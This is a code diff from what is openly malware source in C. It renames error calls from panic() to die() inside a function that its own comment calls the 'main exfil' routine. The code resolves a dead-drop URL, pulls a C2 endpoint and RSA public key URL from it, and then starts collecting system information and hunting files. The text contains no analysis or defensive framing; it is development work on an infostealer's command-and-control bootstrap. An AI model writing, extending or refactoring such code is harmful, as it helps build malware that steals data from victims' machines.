@@ -332,13 +332,13 @@ void mint_uuid(char *id) {
 /* Main exfil fetch C2 config, collect system info, hunt files */
 int sendProfile(void) {
     if (mkdir(tmpDirectory, 0700) == -1 && errno != EEXIST) {
-        panic();
+        die();
     }
 
     Init_str(); 
 
     if (!_strings[0]) {
-        panic();
+        die();
     }
 
     char dead_url[256] = {0};
@@ -347,7 +347,7 @@ int sendProfile(void) {
     CURL *check = curl_easy_init();
     if (!check) {
         Clean_str();
-        panic();
+        die();
     }
     curl_easy_setopt(check, CURLOPT_URL, dead_url);
     curl_easy_setopt(check, CURLOPT_NOBODY, 1L);
@@ -356,14 +356,14 @@ int sendProfile(void) {
     if (curl_easy_perform(check) != CURLE_OK) {
         curl_easy_cleanup(check);
         Clean_str();
-        panic();
+        die();
     }
     curl_easy_cleanup(check);
 
     char *dead_content = fetch_past(dead_url); 
     if (!dead_content) {
         Clean_str();
-        panic();
+        die();
     }
 
     char pubkey_url[1024] = {0};
@@ -371,19 +371,19 @@ int sendProfile(void) {
     if (!from_past(dead_content, pubkey_url, c2_endpoint)) {
         free(dead_content);
         Clean_str();
-        panic();
+        die();
     }
     free(dead_content);
 
     if (strlen(pubkey_url) < 5 || strlen(c2_endpoint) < 5) {
         Clean_str();
-        panic();
+        die();
     }
     strcpy(C2_ENDPOINT, c2_endpoint);
 
     if (curl_global_init(CURL_GLOBAL_DEFAULT) != 0) {
         Clean_str();
-        panic();
+        die();
     }
     OpenSSL_add_all_algorithms();
 
@@ -391,7 +391,7 @@ int sendProfile(void) {
     if (!rsaPubKey) {
         curl_global_cleanup();
         Clean_str();
-        panic();
+        die();
     }
 
     collectSystemInfo(rsaPubKey);
